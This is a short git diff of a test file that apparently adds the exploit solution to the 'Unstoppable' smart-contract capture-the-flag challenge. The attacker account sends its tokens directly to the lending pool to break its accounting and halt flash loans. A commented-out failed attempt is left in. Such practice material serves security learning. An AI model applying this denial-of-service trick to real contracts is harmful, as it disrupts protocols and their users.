@@ -40,6 +40,14 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+
+        // I used code below but I faced invalid ENS name error .
+        // console.log(`attacker address : ${attacker.address} ,  ${typeof(attacker.address)} `)
+        // await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE, {
+        //     from: attacker.address,
+        // });
+
     });
 
     after(async function () {
